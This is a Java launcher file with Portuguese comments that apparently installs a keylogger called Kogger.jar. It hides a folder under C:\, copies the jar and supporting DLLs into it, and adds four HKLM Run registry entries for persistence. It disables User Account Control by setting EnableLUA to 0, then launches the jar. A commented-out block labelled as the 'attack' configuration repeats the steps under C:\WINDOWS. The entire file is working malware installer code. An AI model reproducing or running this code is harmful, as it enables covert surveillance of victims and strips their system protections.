import javax.swing.JOptionPane;

public class Launcher {
	public static void main(String[] args) {

		// Configuração para ataques
		
		// try {
		//
		// Runtime.getRuntime().exec("cmd /c MKDIR \"C:\\WINDOWS\\syscfg\"");
		// Runtime
		// .getRuntime().exec("cmd /c ATTRIB +h \"C:\\WINDOWS\\syscfg\"");
		// Runtime
		// .getRuntime().exec("cmd /c COPY swt-win32.dll \"C:\\WINDOWS\\syscfg\""
		// ); Runtime.getRuntime().exec(
		// "cmd /c COPY swt-gdip-win32.dll \"C:\\WINDOWS\\syscfg\"");
		// Runtime.getRuntime
		// ().exec("cmd /c COPY swt-extension-win32.dll \"C:\\WINDOWS\\syscfg\""
		// ); Runtime.getRuntime().exec(
		// "cmd /c COPY delete.bat \"C:\\WINDOWS\\syscfg\"");
		// Runtime.getRuntime(
		// ).exec("cmd /c COPY Kogger.jar \"C:\\WINDOWS\\syscfg\"");
		//
		// Runtime.getRuntime().exec(
		// "cmd /c REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion" +
		// "\\Run /v Kogger1 /t REG_SZ /d \"C:\\WINDOWS\\syscfg\\Kogger.jar [java -jar]\""
		// );
		//
		// Runtime.getRuntime().exec(
		// "cmd /c REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion" +
		// "\\Run /v Kogger2 /t REG_SZ /d \"C:\\WINDOWS\\syscfg\\Kogger.jar\"");
		//
		// Runtime.getRuntime().exec(
		// "cmd /c REG ADD HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion"
		// +
		// "\\Run /v Kogger3 /t REG_SZ /d \"C:\\WINDOWS\\syscfg\\Kogger.jar [java -jar]\""
		// );
		//
		// Runtime.getRuntime().exec(
		// "cmd /c REG ADD HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion"
		// +
		// "\\Run /v Kogger4 /t REG_SZ /d \"C:\\WINDOWS\\syscfg\\Kogger.jar\"");
		//
		// Runtime.getRuntime().exec("cmd /c \"C:\\WINDOWS\\syscfg\\Kogger.jar\""
		// ); } catch (Exception e) { JOptionPane.showMessageDialog(null,
		// "ERRO!"); return; } JOptionPane.showMessageDialog(null, "FEITO!");

		
		// Configuração de teste
		
		try {
			Runtime.getRuntime().exec("cmd /c MKDIR \"C:\\syscfg\"");
			Runtime.getRuntime().exec("cmd /c ATTRIB +h \"C:\\syscfg\"");
			Runtime.getRuntime().exec("cmd /c COPY swt-win32.dll \"C:\\syscfg\"");
			Runtime.getRuntime().exec("cmd /c COPY swt-gdip-win32.dll \"C:\\syscfg\"");
			Runtime.getRuntime().exec("cmd /c COPY swt-extension-win32.dll \"C:\\syscfg\"");
			Runtime.getRuntime().exec("cmd /c COPY delete.bat \"C:\\syscfg\"");
			Runtime.getRuntime().exec("cmd /c COPY Kogger.jar \"C:\\syscfg\"");

			Runtime.getRuntime()
					.exec("cmd /c REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"
							+ "\\Run /v Kogger1 /t REG_SZ /d \"C:\\syscfg\\Kogger.jar [java -jar]\"");

			Runtime.getRuntime()
					.exec("cmd /c REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"
							+ "\\Run /v Kogger2 /t REG_SZ /d \"C:\\syscfg\\Kogger.jar\"");

			// Desativa UAC
			Runtime.getRuntime()
					.exec("cmd /c REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies"
							+ "\\System /v EnableLUA /t REG_DWORD /d 0 /f");
			
			Runtime.getRuntime()
					.exec("cmd /c REG ADD HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion"
							+ "\\Run /v Kogger3 /t REG_SZ /d \"C:\\syscfg\\Kogger.jar [java -jar]\"");

			Runtime.getRuntime()
					.exec("cmd /c REG ADD HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion"
							+ "\\Run /v Kogger4 /t REG_SZ /d \"C:\\syscfg\\Kogger.jar\"");
			
			// Desativa UAC
			Runtime.getRuntime()
					.exec("cmd /c REG ADD HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Policies"
							+ "\\System /v EnableLUA /t REG_DWORD /d 0 /f");


			Runtime.getRuntime().exec("cmd /c \"C:\\syscfg\\Kogger.jar\"");
		} catch (Exception e) {
			JOptionPane.showMessageDialog(null, "ERRO!");
			return;
		}
		JOptionPane.showMessageDialog(null, "FEITO!");
	}
}